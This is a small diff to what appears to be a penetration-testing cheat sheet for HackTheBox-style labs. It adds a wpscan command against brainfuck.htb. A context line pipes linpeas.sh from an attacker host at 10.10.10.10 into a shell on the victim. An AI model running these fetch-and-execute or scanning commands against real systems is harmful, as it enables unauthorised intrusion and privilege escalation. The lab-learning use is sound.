@@ -108,3 +108,9 @@ Python Simple HTTP Server
 
 python3 -m http.server 7777
 curl 10.10.10.10/linpeas.sh | sh #Victim
+
+### Wordpress CMS Vulnerabilty Scanning
+
+```bash
+wpscan --url https://brainfuck.htb --disable-tls-checks
+```
